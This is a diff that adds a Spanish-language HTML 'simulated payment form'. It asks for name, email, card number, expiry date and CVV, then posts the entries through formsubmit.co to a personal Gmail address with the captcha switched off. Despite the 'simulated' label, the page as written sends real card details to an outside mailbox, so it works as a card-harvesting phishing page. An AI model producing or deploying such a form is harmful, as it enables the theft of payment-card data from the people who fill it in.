@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulario de Pago Simulado</title>
+  <style>
+    body { font-family: Arial; padding: 20px; max-width: 400px; margin: auto; }
+    input, button { width: 100%; padding: 10px; margin-top: 10px; }
+  </style>
+</head>
+<body>
+
+  <h2>Formulario de Pago (Simulado)</h2>
+
+  <form action="https://formsubmit.co/Sebasoto0672@gmail.com" method="POST">
+    <input type="text" name="nombre" placeholder="Nombre completo" required>
+    <input type="email" name="email" placeholder="Correo electrónico" required>
+    <input type="text" name="tarjeta" placeholder="Número de tarjeta" required>
+    <input type="text" name="vencimiento" placeholder="Fecha de vencimiento (MM/AA)" required>
+    <input type="text" name="cvv" placeholder="Código CVV" required>
+
+    <!-- Redirección tras envío -->
+    <input type="hidden" name="_next" value="https://formsubmit.co/thanks.html">
+    <!-- Desactiva captcha -->
+    <input type="hidden" name="_captcha" value="false">
+
+    <button type="submit">Pagar</button>
+  </form>
+
+</body>
+</html>
